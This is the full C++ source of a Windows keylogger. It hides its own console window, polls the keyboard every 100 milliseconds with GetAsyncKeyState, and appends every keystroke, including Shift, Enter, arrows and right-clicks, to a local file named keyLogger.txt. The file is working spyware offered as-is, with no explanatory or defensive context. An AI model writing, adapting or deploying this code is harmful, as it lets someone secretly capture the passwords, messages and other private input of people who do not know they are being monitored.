#include <iostream>
#include <fstream>
#include <windows.h>
#include <winuser.h>
#include<stdio.h>

using namespace std;

void runBackground(){
    HWND window;
    AllocConsole();
    window = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(window,0);
}


void writeLogFile(string input){
    fstream LogFile;
	LogFile.open("keyLogger.txt", fstream::app);
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}

void KeyLogger(int Key) {
	switch (Key) {
	case VK_SPACE:
		writeLogFile(" ");
		break;
	case VK_RETURN:
		writeLogFile(" #BACK# ");
		break;
	case '¾':
		writeLogFile(".");
		break;
	case VK_SHIFT:
		writeLogFile("#SHIFT#");
		break;
	case VK_BACK:
		writeLogFile("\b");
		break;
	case VK_RBUTTON:
		writeLogFile("#R_CLICK#");
		break;
	case VK_CAPITAL:
		writeLogFile("#CAPS_LCOK");
		break;
	case VK_TAB:
		writeLogFile("#TAB");
		break;
	case VK_UP:
		writeLogFile("#UP_ARROW_KEY");
		break;
	case VK_DOWN:
		writeLogFile("#DOWN_ARROW_KEY");
		break;
	case VK_LEFT:
		writeLogFile("#LEFT_ARROW_KEY");
		break;
	case VK_RIGHT:
		writeLogFile("#RIGHT_ARROW_KEY");
		break;
	case VK_CONTROL:
		writeLogFile("#CONTROL");
		break;
	case VK_MENU:
		writeLogFile("#ALT");
		break;
	default:
		writeLogFile(string(1,char(Key)));
	}
}


int main() {
    runBackground();
    char k = 'x';
    while(true){
        Sleep(100);
        for(k=8;k<=190;k++){
                    if(GetAsyncKeyState(k) == -32767){
                        KeyLogger(k);
                    }
        }
    }
    return 0;
}
